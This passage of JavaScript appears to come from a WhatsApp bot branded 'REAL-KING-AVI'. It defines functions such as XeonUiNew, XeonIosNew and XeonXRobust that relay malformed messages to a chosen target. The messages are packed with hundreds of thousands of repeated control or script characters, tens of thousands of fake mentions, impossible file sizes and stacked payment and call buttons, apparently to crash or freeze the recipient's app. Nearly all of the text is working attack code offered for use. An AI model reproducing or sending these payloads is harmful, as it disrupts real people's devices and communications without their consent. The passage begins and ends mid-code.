                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "🦄 REAL-KING-AVI 🦄",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "🦄 REAL-KING-AVI 🦄",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: jidds,
                    mentions: jidds
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
        }
        }
        
        const Qrad = {
			key: {
				remoteJid: 'p',
				from: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄 REAL-KING-AVI 🦄${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const XeonRep = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄 REAL-KING-AVI 🦄${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const XeonRep2 = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄 REAL-KING-AVI 🦄${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		const XeonRep3 = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄 REAL-KING-AVI 🦄${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}
        
        async function XeonButtNew(target, o, Ptcp = true) {
   await Avishka.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "🦄 REAL-KING-AVI 🦄",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: o,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🦄 REAL-KING-AVI 🦄\n" + "@916909137213".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '🦄 REAL-KING-AVI 🦄', url: \"https://youtube.com/dgxeon\", merchant_url: \"https://youtube.com/dgxeon\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "🦄 REAL-KING-AVI 🦄",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
  };
async function XeonUiNew(target, o, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🦄 REAL-KING-AVI 🦄",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: o
									},
									hasMediaAttachment: true
								},
								body: {
									text: "🦄 REAL-KING-AVI 🦄" + "ꦾ".repeat(50000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 🦄 REAL-KING-AVI 🦄 \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🦄 REAL-KING-AVI 🦄" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"sections\":[{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🦄 REAL-KING-AVI 🦄\",\"flow_id\":\"🦄 REAL-KING-AVI 🦄\",\"flow_message_version\":\"9\",\"flow_token\":\"🦄 REAL-KING-AVI 🦄\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: target,
					quoted: XeonRep
				}
			);

			await Avishka.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
		};
	
async function XeonCallNew(target, o, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🦄 REAL-KING-AVI 🦄 ",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: o
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎🦄 REAL-KING-AVI 🦄"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 🦄 REAL-KING-AVI 🦄 \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🦄 REAL-KING-AVI 🦄" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"sections\":[{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🦄 REAL-KING-AVI 🦄\",\"flow_id\":\"🦄 REAL-KING-AVI 🦄\",\"flow_message_version\":\"9\",\"flow_token\":\"??드림 가이 Xeon\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: target,
					quoted: XeonRep2
				}
			);

			await Avishka.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
		};

function followNewsletter(channelId) {
  try {
    Avishka.newsletterFollow(channelId);
    console.log(`running ${channelId}`);
  } catch (error) {
    console.error('Newsletter follow error:', error);
  }
}


		async function XeonDocNew(target, o, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🦄 REAL-KING-AVI 🦄",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: o
									},
									hasMediaAttachment: true
								},
								body: {
									text:  "🦄 REAL-KING-AVI 🦄"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 🦄 REAL-KING-AVI 🦄 \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🦄 REAL-KING-AVI 🦄" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"sections\":[{\"title\":\"🦄 REAL-KING-AVI 🦄\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🦄 REAL-KING-AVI 🦄\",\"flow_id\":\"🦄 REAL-KING-AVI 🦄\",\"flow_message_version\":\"9\",\"flow_token\":\"🦄 REAL-KING-AVI 🦄\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: target,
					quoted: XeonRep2
				}
			);

			await Avishka.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
		};
		
		async function XeonIosOld(target) {
await Avishka.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
} 
async function XeonIosPayOld(jid) {
			Avishka.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
		};
	async function XeonIosNew(jid) {
			Avishka.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': ' 🦄 REAL-KING-AVI 🦄' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
		};
        
        
        async function XeonNullNew(target, o, Ptcp = true) {
			await Avishka.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "🦄 REAL-KING-AVI 🦄",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: o,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "🦄 REAL-KING-AVI 🦄\n" + "@916909137213".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '🦄 REAL-KING-AVI 🦄', url: \"https://youtube.com/dgxeon\", merchant_url: \"https://youtube.com/dgxeon\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["916909137213@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "🦄 REAL-KING-AVI 🦄",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
		};
		
		async function XeonCallOld(target, Ptcp = true) {
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "",
        locationMessage: {},
        hasMediaAttachment: true
       },
       body: {
        text: ""
       },
       nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: " 🦄 REAL-KING-AVI 🦄 "
       },
       carouselMessage: {}
      }
     }
    }
   }), {
    userJid: target,
    quoted: XeonRep3
   });

   await Avishka.relayMessage(target, etc.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
  };
  async function XeonXRobust(target, o, Ptcp = true) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await Avishka.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "🦄 REAL-KING-AVI 🦄",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: o,
         },
         hasMediaAttachment: true,
        },

									body: { text: '🦄 REAL-KING-AVI 🦄' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "🦄 REAL-KING-AVI 🦄",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
